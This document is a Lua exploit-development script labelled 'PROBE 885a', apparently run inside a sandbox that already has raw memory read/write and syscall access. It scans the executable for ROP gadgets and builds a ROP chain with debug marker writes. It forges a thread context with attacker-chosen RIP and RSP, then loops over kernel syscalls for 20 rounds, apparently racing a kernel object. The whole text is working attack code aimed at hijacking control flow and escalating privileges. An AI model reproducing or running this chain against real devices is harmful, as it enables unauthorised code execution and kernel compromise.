-- CRASH_CLASS: HIGH
-- PROBE 885a: the loop, with a debug channel.  Every phase writes a marker into a mapped
-- page through `mov [rdi],rax; ret`, so a death names the instruction group it reached
-- instead of dumping registers.  Layout (word index i at start + 8*(i-1)):
--   w1  mov-gadget          <- loop re-entry: writes the M2 marker, then ret pops w2
--   w2..w9  pops + 662
--   w10.. pad 0x400 of dead pops (keeps the stub frame away from w1)
--   w138 fn                 <- stub entered by fall-through
--   w139.. M1 marker, then w144.. M2 + pop_rsp start
print("=== PROBE 885a: loop with markers ===")
local ROUNDS=20
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end
local fn=to_num(syscall.pipe.fn_addr)
print("[0] pid=" .. tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20))))
local info=memory.alloc(0x200); wd(info,0x160)
pcall(function() mk(593)(uint64(0),uint64(info)) end)
local ebase=(rd(info+0x10C) or 0)*4294967296+(rd(info+0x108) or 0)
local function find_pat(base,limit,pat)
    local off=0
    while off<limit do local want=limit-off; if want>0x1000 then want=0x1000 end
        local ok,s=pcall(function() return memory.read_buffer(base+off,want) end)
        if not ok or type(s)~="string" then return nil end
        local i=string.find(s,pat,1,true); if i then return base+off+i-1 end
        off=off+want end
end
local pop_rax=find_pat(ebase,0x494000,string.char(0x58,0xC3))
local pop_rdi=find_pat(ebase,0x494000,string.char(0x5F,0xC3))
local pop_rsi=find_pat(ebase,0x494000,string.char(0x5E,0xC3))
local pop_rdx=find_pat(ebase,0x494000,string.char(0x5A,0xC3))
local pop_rsp=find_pat(ebase,0x494000,string.char(0x5C,0xC3))
local mov_rdi_rax=find_pat(ebase,0x494000,string.char(0x48,0x89,0x07,0xC3))
local jmp_g=find_pat(ebase,0x494000,string.char(0xEB,0xFE))
print(string.format("[0] eboot=%08X mov=[rdi],rax=%s", ebase, tostring(mov_rdi_rax)))
if not (pop_rax and pop_rdi and pop_rsi and pop_rdx and pop_rsp and mov_rdi_rax and jmp_g) then print("[0] gadget missing") return end
local page=0x4000; local STACK=page*8
local function mmap(px) local _,a=pcall(function() return mk(477)(uint64(0),uint64(px),uint64(3),uint64(0x1002),uint64(0xFFFFFFFF),uint64(0)) end); local v=to_num(a); if v~=0 then zero(v,px) end; return v end
local Ctx={MAGIC=0x108,TYPE=0x110,CS=0x0C0,RIP=0x0E0,RSP=0x0F8,SS=0x100,RDI=0x048,RSI=0x050,RDX=0x058,RAX=0x078}
local D=mmap(page); local ids=mmap(page); local stA=mmap(page); local stB=mmap(page)
local out=mmap(page); local res=mmap(page); local M=mmap(page)
local ts=memory.alloc(16)
local function sleep_ms(ms) wq(ts,0); wq(ts+8,ms*1000000); pcall(function() mk(240)(uint64(ts),uint64(0)) end) end
local sc669,sc662,sc664=mk(669),mk(662),mk(664)
local function build(idsPg,stPg)
    local block=mmap(STACK); if block==0 then return nil end
    local start=block+STACK-0x800
    local w={}
    w[1]=mov_rdi_rax
    w[2]=pop_rdi; w[3]=idsPg; w[4]=pop_rsi; w[5]=1; w[6]=pop_rdx; w[7]=stPg; w[8]=pop_rax; w[9]=662
    for k=1,64 do w[10+2*(k-1)]=pop_rdi; w[11+2*(k-1)]=0 end
    w[138]=fn
    w[139]=pop_rdi; w[140]=M;     w[141]=pop_rax; w[142]=0x4D31; w[143]=mov_rdi_rax
    w[144]=pop_rdi; w[145]=M+8;   w[146]=pop_rax; w[147]=0x4D32; w[148]=pop_rsp; w[149]=start
    for i=1,#w do wq(start+8*(i-1),uint64(w[i])) end
    local ctx=memory.alloc(0x500); zero(ctx,0x500)
    wq(ctx+Ctx.MAGIC,uint64(0x480)); wq(ctx+Ctx.TYPE,uint64(0x10000))
    wq(ctx+Ctx.CS,uint64(0x43)); wq(ctx+Ctx.SS,uint64(0x3B))
    wq(ctx+Ctx.RIP,uint64(fn)); wq(ctx+Ctx.RSP,uint64(start+8))
    wq(ctx+Ctx.RDI,uint64(idsPg)); wq(ctx+Ctx.RSI,uint64(1)); wq(ctx+Ctx.RDX,uint64(stPg)); wq(ctx+Ctx.RAX,uint64(662))
    local tb=memory.alloc(8); wq(tb,uint64(0))
    local ok,rv=pcall(function() return mk(430)(uint64(ctx),uint64(tb),uint64(0)) end)
    return (ok and to_num(rv)==0), start, block
end
local rounds=0
for r=1,ROUNDS do
    rounds=r
    wq(D+0x00,uint64(0)); wq(D+0x08,uint64(0)); wq(D+0x10,uint64(res)); wq(D+0x18,uint64(res)); wd(D+0x20,-1); wd(D+0x24,0)
    wd(out,0); wd(res,0); wd(stA,0); wd(stB,0); wd(M,0); wd(M+8,0)
    local okc=pcall(function() sc669(uint64(0x1001),uint64(D),uint64(2),uint64(1),uint64(out)) end)
    local id=rd(out) or 0
    if id==0 or not okc then break end
    wd(res,id)
    pcall(function() sc662(uint64(res),uint64(1),uint64(stA)) end)   -- [T+2] -> 1
    local hi=id+0x10000
    -- wait for item1 to be state 3
    local ready=false
    for t=1,50 do
        wd(stB,0); pcall(function() sc664(uint64(res),uint64(1),uint64(stB)) end)
        local sv=rd(stB) or 0
        if sv==3 or sv==0x10003 then ready=true; break end
        sleep_ms(1)
    end
    if not ready then print(string.format("[!] item1 never became ready at r=%d", r)); break end
    wq(ids,uint64(hi)); wd(stA,0)
    local ok2,start,block=build(ids,stA)
    if not ok2 then print(string.format("[!] spawn failed r=%d", r)); break end
    sleep_ms(2)
    print(string.format("[C] r=%d id=%06X M1=%08X M2=%08X status=%08X start=%08X", r, hi, rd(M) or 0, rd(M+8) or 0, rd(stA) or 0, start))
    wd(res,hi); wd(stB,0)
    pcall(function() sc662(uint64(res),uint64(1),uint64(stB)) end)
end
print(string.format("[D] rounds=%d", rounds))
print("[Z] alive pid=" .. tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20))))
